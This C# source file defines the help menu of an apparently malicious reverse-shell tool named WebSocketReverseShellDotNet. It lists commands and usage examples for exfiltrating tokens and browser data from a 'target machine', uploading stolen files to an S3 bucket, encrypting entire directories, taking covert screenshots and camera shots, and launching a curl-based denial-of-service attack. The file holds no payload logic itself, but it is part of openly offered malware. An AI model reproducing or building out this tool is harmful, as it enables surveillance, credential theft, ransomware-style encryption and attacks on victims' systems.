using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class HelpCommand : Command
    {

        private String? CommandName { get; set; }
        private String? Description { get; set; }
        private String? RequiredParams { get; set; }
        private String? Example { get; set; }

        public HelpCommand(string commandName, string description, 
            string requiredParams, string example)
        {
            CommandName = commandName;
            Description = description;
            RequiredParams = requiredParams;
            Example = example;
        }

        public HelpCommand()
        {

        }

        public override string ToString()
        {
            return $@"
{{
    commandName= {CommandName}
    , description= {Description}
    , requiredParams= {RequiredParams}
    , example= {Example}
}}";
        }

            public string ExecuteCommand(string command)
            {
            List<HelpCommand> helpCommandList = new List<HelpCommand>
            {
            
                new HelpCommand("upload", "upload files to s3 bucket",
            "filePath", "upload <file>"),

                new HelpCommand("rick-roll", "play rick roll music",
            "NA", "rick-roll"),
                new HelpCommand("/encryption", "Encrypt or Decrypt an entire dir",
            "arg1= ['encrypt' or 'decrypt'] arg2= [Dir]", "/encryption encrypt C:\\users\\user"),

                new HelpCommand("/screenshot", "take screen shot",
            "NA", "/screenshot"),

                new HelpCommand("/tokens", "Exfiltrate tokens from target machine",
            "NA", "/tokens"),

                new HelpCommand("/browser", "Exfiltrate data from browser in the target",
            "NA", "/browser"),

                new HelpCommand("/camerashot", "take camera shot",
            "NA", "/camerashot"),

  
                new HelpCommand("/attack", "start denial of service attack by calling curl every few seconds",
            "arg1= ['curl' or 'stop']", "'/attack curl <rest of the command>' or '/attack stop'"),
                new HelpCommand("/exit", "Terminate shell",
            "NA", "/exit"),
             
            };


            string result = string.Join("", helpCommandList.Select(command => command.ToString()));
            return result;
        }
    }
}
